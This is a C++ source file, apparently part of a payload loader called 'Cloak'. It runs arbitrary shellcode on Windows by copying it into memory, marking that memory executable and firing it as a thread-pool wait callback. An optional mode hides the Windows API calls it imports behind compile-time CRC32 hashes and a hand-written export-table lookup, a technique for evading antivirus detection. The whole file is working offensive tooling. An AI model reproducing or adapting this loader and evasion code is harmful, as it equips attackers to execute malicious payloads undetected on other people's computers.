#include "Cloak.hpp"

#ifdef THREADPOOLWAIT

#ifdef HASH_API

constexpr int RandomCompileTimeSeed(void)
{
	return '0' * -23784 +
		__TIME__[7] * 345 +
		__TIME__[6] * 12 +
		__TIME__[4] * 2345123 +
		__TIME__[3] * 623 +
		__TIME__[1] * 95897 +
		__TIME__[0] * 2;
};

constexpr auto g_KEY = RandomCompileTimeSeed() % RAND;

constexpr DWORD HashStringCrc32(const char* String) {
	UINT32      uMask	= 0x00;
    UINT32      uHash	= g_KEY;
	INT         i		= 0x00;

	while ( String[i] != 0 ) {
		uHash = uHash ^ ( UINT32 ) String[i];

		for ( int ii = 0; ii < 8; ii++ ) {
			uMask = -1 * ( uHash & 1 );
			uHash = ( uHash >> 1 ) ^ ( 0xEDB88320 & uMask );
		}

		i++;
	}

	return ~uHash;
}

#define RTIME_HASHA( API ) HashStringCrc32( ( const char* ) API )
#define CTIME_HASHA( API ) constexpr auto API##_CRC32A = HashStringCrc32( ( const char* ) #API );

FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {
	PBYTE pBase = ( PBYTE ) hModule;

	PIMAGE_DOS_HEADER   pImgDosHeader  = ( PIMAGE_DOS_HEADER ) pBase;
	if ( pImgDosHeader->e_magic != IMAGE_DOS_SIGNATURE ) {
        return NULL;
    }

	PIMAGE_NT_HEADERS   pImgNtHeaders  = ( PIMAGE_NT_HEADERS ) ( pBase + pImgDosHeader->e_lfanew );
	if ( pImgNtHeaders->Signature != IMAGE_NT_SIGNATURE ) {
		return NULL;
    }

	IMAGE_OPTIONAL_HEADER		ImgOptionalHeader		= pImgNtHeaders->OptionalHeader;
	PIMAGE_EXPORT_DIRECTORY		pImgExportDirectory     = ( PIMAGE_EXPORT_DIRECTORY ) ( pBase + ImgOptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress );
	PDWORD						pdwFunctionNameArray	= ( PDWORD ) ( pBase + pImgExportDirectory->AddressOfNames );
	PDWORD						pdwFunctionAddressArray	= ( PDWORD ) ( pBase + pImgExportDirectory->AddressOfFunctions );
	PWORD						pwFunctionOrdinalArray	= ( PWORD ) ( pBase + pImgExportDirectory->AddressOfNameOrdinals );

	for ( DWORD i = 0; i < pImgExportDirectory->NumberOfFunctions; i++ ) {
		CHAR*	pFunctionName		= ( CHAR* ) ( pBase + pdwFunctionNameArray[i] );
		PVOID	pFunctionAddr   	= ( PVOID ) ( pBase + pdwFunctionAddressArray[pwFunctionOrdinalArray[i]] );

		if ( dwApiNameHash == RTIME_HASHA( pFunctionName ) ) { 
			return ( FARPROC ) pFunctionAddr;
		}
	}

	return NULL;
}

// ---

typedef HANDLE ( WINAPI * fnCreateEventA ) (
    LPSECURITY_ATTRIBUTES lpEventAttributes,
    BOOL                  bManualReset,
    BOOL                  bInitialState,
    LPCSTR                lpName
);

typedef LPVOID ( WINAPI * fnVirtualAlloc ) (
    LPVOID  lpAddress,
    SIZE_T  dwSize,
    DWORD   flAllocationType,
    DWORD   flProtect
);

typedef BOOL ( WINAPI * fnVirtualProtect ) (
    LPVOID  lpAddress,
    SIZE_T  dwSize,
    DWORD   flNewProtect,
    PDWORD  lpflOldProtect
);

typedef PTP_WAIT ( WINAPI * fnCreateThreadpoolWait ) (
    PTP_WAIT_CALLBACK       pfnwa,
    PVOID                   pv,
    PTP_CALLBACK_ENVIRON    pcbe
);

// typedef void ( WINAPI * fnSetThreadpoolWait ) (
//     PTP_WAIT  pwa,
//     HANDLE    h,
//     PFILETIME pftTimeout
// );

typedef DWORD ( WINAPI * fnWaitForSingleObject ) (
    HANDLE  hHandle,
    DWORD   dwMilliseconds
);

// ---

CTIME_HASHA(CreateEventA)
CTIME_HASHA(VirtualAlloc)
CTIME_HASHA(VirtualProtect)
CTIME_HASHA(CreateThreadpoolWait)
// CTIME_HASHA(SetThreadpoolWait)
CTIME_HASHA(WaitForSingleObject)

BOOL ThreadPoolWait(IN PBYTE pbPayload[], IN SIZE_T sPayloadSize) {
    
    HMODULE hKernel32 = NULL;

    if ( ( hKernel32 = LoadLibraryA( "KERNEL32.dll" ) ) == NULL ) {
        #ifdef DEBUG
        printf( "[-] LoadLibraryA Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnCreateEventA pCreateEventA = ( fnCreateEventA ) GetProcAddressH( hKernel32, CreateEventA_CRC32A );
    if ( pCreateEventA == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for CreateEventA\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnVirtualAlloc pVirtualAlloc = ( fnVirtualAlloc ) GetProcAddressH( hKernel32, VirtualAlloc_CRC32A );
    if ( pVirtualAlloc == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for VirtualAlloc\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnVirtualProtect pVirtualProtect = ( fnVirtualProtect ) GetProcAddressH( hKernel32, VirtualProtect_CRC32A );
    if ( pVirtualProtect == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for VirtualProtect\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnCreateThreadpoolWait pCreateThreadpoolWait = ( fnCreateThreadpoolWait ) GetProcAddressH( hKernel32, CreateThreadpoolWait_CRC32A );
    if ( pCreateThreadpoolWait == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for CreateThreadPoolWait\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    // fnSetThreadpoolWait pSetThreadpoolWait = ( fnSetThreadpoolWait ) GetProcAddressH( hKernel32, SetThreadpoolWait_CRC32A );
    // if ( pSetThreadpoolWait == NULL ) {
    //     #ifdef DEBUG
    //     printf( "[-] Unable to get address for SetThreadPoolWait\n" );
    //     #endif // !DEBUG
        
    //     return FALSE;
    // }

    fnWaitForSingleObject pWaitForSingleObject = ( fnWaitForSingleObject ) GetProcAddressH( hKernel32, WaitForSingleObject_CRC32A );
    if ( pCreateEventA == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for WaitForSingleObject\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    // ---

    PVOID       pPayloadAddress     = NULL;
    HANDLE      hEvent              = NULL;
    DWORD       dwOldProtect        = NULL;
    PTP_WAIT    pThreadPoolWait     = NULL;

    hEvent = pCreateEventA( NULL, FALSE, TRUE, NULL );
    if ( hEvent == INVALID_HANDLE_VALUE ) {
        #ifdef DEBUG
        printf( "[-] CreateEventA Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    pPayloadAddress = pVirtualAlloc( NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
    if ( pPayloadAddress == NULL ) {
        #ifdef DEBUG
        printf( "[-] VirtualAlloc Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }
    memcpy( pPayloadAddress, pbPayload, sPayloadSize );

    if ( ! pVirtualProtect( pPayloadAddress, sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtect ) ) {
        #ifdef DEBUG
        printf( "[-] VirtualProtect Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    pThreadPoolWait = pCreateThreadpoolWait( ( PTP_WAIT_CALLBACK ) pPayloadAddress, NULL, NULL );
    SetThreadpoolWait( pThreadPoolWait, hEvent, NULL );
    pWaitForSingleObject( hEvent, WAIT_TIME );

    return TRUE;
}

#else

BOOL ThreadPoolWait(IN PBYTE pbPayload[], IN SIZE_T sPayloadSize) {
    PVOID       pPayloadAddress     = NULL;
    HANDLE      hEvent              = NULL;
    DWORD       dwOldProtect        = NULL;
    PTP_WAIT    pThreadPoolWait     = NULL;

    hEvent = CreateEventA( NULL, FALSE, TRUE, NULL );
    if ( hEvent == INVALID_HANDLE_VALUE ) {
        #ifdef DEBUG
        printf( "[-] CreateEventA Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    pPayloadAddress = VirtualAlloc( NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
    if ( pPayloadAddress == NULL ) {
        #ifdef DEBUG
        printf( "[-] VirtualAlloc Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }
    memcpy( pPayloadAddress, pbPayload, sPayloadSize );

    if ( ! VirtualProtect( pPayloadAddress, sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtect ) ) {
        #ifdef DEBUG
        printf( "[-] VirtualProtect Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    pThreadPoolWait = CreateThreadpoolWait( ( PTP_WAIT_CALLBACK ) pPayloadAddress, NULL, NULL );
    SetThreadpoolWait( pThreadPoolWait, hEvent, NULL );
    WaitForSingleObject( hEvent, WAIT_TIME );

    return TRUE;
}

#endif // !HASH_API

#endif // !THREADPOOLWAIT